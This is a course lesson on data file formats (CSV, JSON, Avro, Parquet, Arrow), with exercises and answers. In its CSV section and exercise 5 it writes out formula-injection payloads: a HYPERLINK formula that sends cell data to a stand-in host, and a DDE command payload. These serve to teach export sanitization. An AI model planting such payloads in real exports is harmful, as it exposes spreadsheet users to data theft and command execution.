# 11.1 File formats: CSV, JSON, Parquet, Avro, Arrow

*About 10 hours. Prerequisites: 07.3, 08.3, 10.2. Lab: [`lab_11_1_file_formats.py`](labs/lab_11_1_file_formats.py).*

The format you store data in decides how fast every future query is, how much every future query costs, and how many
future bugs you'll have. I've seen a friend's startup cut its cloud bill by 90% with one change: converting a data lake of gzipped CSVs to
Parquet. No new infrastructure, no clever algorithm. The queries simply stopped reading bytes they didn't need.

This lesson is about the formats you'll meet in data platforms, what's inside them, and how to choose. Spoiler: for analytics,
the answer is almost always Parquet. But you need to know why, and when it isn't.

## Row vs column

The fundamental split, which you've met in 07.3 and 08.4:

- **Row-oriented** formats store all the fields of a record together: CSV, JSON, Avro. Good for writing records one at a time (logs, events, messages) and
  reading whole records.
- **Column-oriented** formats store all the values of a column together: Parquet, ORC, Arrow. Good for analytics, which reads few columns of many rows, and
  for compression, because values in a column are similar to each other.

## CSV: the universal disappointment

Everybody can read CSV, which is its only virtue. Its problems:

- **No types.** Everything is text; every reader guesses (10.1: leading zeros, IDs as floats, dates as strings).
- **No standard.** RFC 4180 exists, but in practice: different delimiters (`;` in locales that use `,` for decimals), quoting rules, escape characters,
  embedded newlines, encodings (UTF-8, Latin-1, UTF-8 with a BOM), and how NULL is written (empty, `NULL`, `NA`, `\N`).
- **No schema evolution.** Add a column in the middle and every positional reader breaks.
- **Slow and big.** Must be parsed character by character; no column pruning, no statistics to skip data. Compressed with gzip it's smaller, but gzip isn't
  splittable, so one big `.csv.gz` file is processed by a single core.

And one security issue people forget: **CSV/formula injection**. A cell starting with `=`, `+`, `-` or `@` is interpreted as a formula by Excel and similar
tools. If your system exports user-controlled data (a name, a comment) to CSV and someone opens it in a spreadsheet, a "name" like
`=HYPERLINK("http://evil.example/?leak="&A1, "click")` becomes an active formula. Sanitize exports that humans will open (prefix dangerous cells with a
single quote), and don't open untrusted CSVs with formulas enabled.

Use CSV for small exchanges with humans and legacy systems. Convert to something better at the edge of your platform.

## JSON and NDJSON

JSON has types (strings, numbers, booleans, null, arrays, objects) and nesting, which makes it the natural format for API payloads and events. For data
files, use **newline-delimited JSON** (NDJSON / JSON Lines): one JSON object per line, so files can be split and streamed.

Downsides: verbose (field names repeated in every record), slow to parse, and numbers are ambiguous (JSON has one number type; large integers lose precision
in parsers that use float64, which is why some APIs send 64-bit IDs as strings). Schema is implicit, so every producer can drift. Good as a raw landing format
("bronze", 11.2), converted to typed columnar formats after validation.

## Avro

Avro is a **row-oriented binary** format with an explicit **schema** (defined in JSON) stored in the file header. Compact, fast to write, and designed for
**schema evolution**: a reader with a newer or older schema can read data written with a different version, following resolution rules (new fields need
defaults, removed fields are ignored). That makes it the classic choice for **event streams and Kafka messages** (14.1), usually with a **schema registry** that
stores every version of each schema and rejects incompatible changes.

Evolution rules worth knowing (they apply, with variations, to Protobuf and Parquet too):

- **Adding a field with a default**: backward and forward compatible.
- **Removing a field that has a default**: compatible.
- **Renaming** a field: a breaking change, unless you use aliases.
- **Changing a type**: breaking, except for specific promotions (int to long, float to double).

## Parquet: what's inside

Parquet is the default storage format of the analytical world (Spark, DuckDB, Polars, BigQuery, Snowflake, Athena, every lakehouse). Understanding its layout
explains most of its performance:

```
file
├── row group 1 (e.g. ~128 MB or ~1M rows)
│   ├── column chunk "order_id"  → pages (encoded + compressed) + statistics (min, max, null count)
│   ├── column chunk "amount"    → pages ...
│   └── ...
├── row group 2
│   └── ...
└── footer: schema, row group locations, column chunk statistics
```

- **Columnar within row groups**: a query reading 2 of 40 columns reads roughly 5% of the bytes (you measured this in 08.3's lab).
- **Statistics per column chunk** (min, max, null count): readers skip whole row groups that can't match a filter (**predicate pushdown**). A filter on
  `order_ts >= '2025-06-01'` skips row groups whose max timestamp is earlier. This works dramatically better if the data is **sorted** (or clustered) by the
  filtered column, because then row groups have narrow, non-overlapping ranges.
- **Encodings** before compression exploit the structure of columns:
  - **dictionary encoding**: low-cardinality columns (country, status) are stored as small integer codes plus a dictionary;
  - **run-length encoding (RLE)**: repeated values stored as (value, count), great for sorted columns;
  - **delta encoding**: store differences between consecutive values, great for timestamps and sorted IDs.
- **Compression** on top: Snappy (fast, moderate ratio, the classic default), ZSTD (better ratio at similar speed, increasingly the default), gzip (slower).
- **Nested data** (structs, lists, maps) is supported with the Dremel encoding (repetition and definition levels), so JSON-like data can be stored in columns.
- **Schema in the footer**, with real types (int32/64, decimal, timestamp with time zone, strings as UTF-8 byte arrays).

The consequences for you: sort data by the columns you filter on, keep row groups reasonably large, avoid thousands of tiny files (next lesson), and choose
ZSTD unless you have a reason not to.

ORC is Parquet's close cousin from the Hive world, with similar ideas. You'll meet it in older Hadoop platforms.

## Arrow: the in-memory format

**Apache Arrow** is a columnar *in-memory* format: a standard way to lay out columns in RAM so that different systems (pandas, Polars, DuckDB, Spark, R, GPU
libraries, databases' client drivers) can share data without serialization, sometimes without copying at all (10.2). Its file forms, **Arrow IPC / Feather**,
are extremely fast to read and write (little or no encoding), but larger than Parquet because they don't compress as aggressively. Rule of thumb: Parquet for
storage at rest, Arrow for data in motion between processes and in memory.

## A note on pickle and friends

`pickle`, `joblib`, `torch.save` (with pickle underneath) are **not data formats**. They serialize Python objects and, on load, can execute arbitrary code
(53.2 will show you how). They're also tied to library versions: a pickled DataFrame from pandas 1.x may not load in pandas 3. Never use pickle for data you
store long-term or exchange with anyone, and never unpickle anything you didn't create yourself. For data: Parquet or Arrow. For model weights:
`safetensors` or ONNX (49.3).

## Choosing a format

| Use case | Format |
|---|---|
| Analytics tables, data lake, ML training data | Parquet (ZSTD), sorted/partitioned by common filters |
| Event streams, Kafka messages, schema-evolving records | Avro or Protobuf with a schema registry |
| API payloads, raw landing of semi-structured data | JSON / NDJSON (then convert) |
| Exchange with humans, spreadsheets, legacy | CSV (sanitized, documented delimiter and encoding) |
| Fast interchange between processes, caches, in-memory | Arrow IPC / Feather |
| Model weights | safetensors, ONNX. Not pickle |

> **Scar tissue.** I had a Raspberry Pi logging sensor readings at home, and the script wrote one Parquet file per batch, every ten
> seconds, for a year and a half. When I finally wanted to look at the history, the folder on my NAS had a few million files averaging a
> few kilobytes each, and just listing them took longer than reading the data would have. Compaction exists for a reason. So do table
> formats that track files for you. The data was perfect. It was also unreachable.

## Things that will bite you

- **Type guessing** on CSV and JSON.
- **Large integers in JSON** losing precision.
- **Unsorted data** making Parquet statistics useless for skipping.
- **Thousands of tiny Parquet files** (11.2).
- **Breaking schema changes** in event formats without a registry to catch them.
- **Pickle** as a storage format.
- **CSV injection** in exports.

## Exercises

1. Explain why `SELECT AVG(amount) FROM sales WHERE country = 'AR'` reads less data from Parquet than from CSV, naming three separate mechanisms.
2. You have a Parquet table of events that is always queried with a filter on `event_date` and often on `user_id`. How would you lay it out?
3. An Avro schema v1 has fields `id` and `email`. v2 adds `phone` without a default. Which readers break: old readers reading new data, or new readers reading old
   data?
4. Why is one 20 GB `.csv.gz` file a bad input for a distributed job, even with a big cluster?
5. A user registers with the name `=cmd|' /C calc'!A0`. Your admin panel exports users to CSV for the support team. What could happen, and how do you prevent it?

<summary>Answers</summary>

1. Column pruning (read only `amount` and `country` chunks), predicate pushdown with statistics (skip row groups whose country min/max excludes 'AR'; very effective
   if data is sorted or partitioned by country), and efficient encodings/compression (the `country` column is a tiny dictionary + RLE; less I/O and faster
   decoding than parsing text). Partition pruning (11.2) is a fourth, if the table is partitioned by country.

2. Partition by `event_date` (directory per day, so date filters skip whole partitions), and within each partition sort (or cluster) by `user_id` so row-group
   statistics on `user_id` let readers skip most row groups for a user lookup. Keep files large (hundreds of MB), compressed with ZSTD. Table formats (11.2) can
   maintain that clustering for you.

3. New readers reading old data: the reader's schema has `phone` with no default, and old records don't have it, so resolution fails. Old readers reading new data are
   fine (they ignore the unknown field). Fix: add the field with a default (`null` with a union type `["null", "string"]`), which a schema registry with backward
   compatibility checks would have enforced.

4. gzip isn't splittable: to read line N you must decompress everything before it, so the file is processed by a single task on one core while the rest of the
   cluster waits. Use splittable formats (Parquet, or many smaller compressed files, or bzip2/zstd with framing if you must keep text).

5. Formula injection: when the support agent opens the file in a spreadsheet, the cell is evaluated as a formula; with older, misconfigured or permissive setups,
   DDE-style payloads can try to run commands, and `HYPERLINK`-style payloads can exfiltrate data from other cells. Prevent it by sanitizing exported cells that
   start with `=`, `+`, `-`, `@`, tab or carriage return (prefix a single quote), and by validating inputs like names at registration.
